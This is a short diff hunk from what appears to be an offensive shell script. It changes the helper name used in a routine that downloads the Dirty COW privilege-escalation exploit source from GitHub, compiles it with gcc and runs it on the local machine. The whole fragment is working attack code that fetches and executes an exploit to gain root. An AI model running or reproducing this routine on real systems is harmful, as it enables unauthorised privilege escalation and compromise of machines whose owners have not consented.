@@ -236,7 +236,7 @@ escalate(){
 
 	dirty(){
 		echo -e "This may take some time...\n"
-		download https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
+		downld https://raw.githubusercontent.com/d4rk007/dirtycow/master/dirty.c
 		gcc -pthread ${direct}/dirty.c -o ${direct}/dirty -lcrypt
 		${direct}/./dirty
 	}
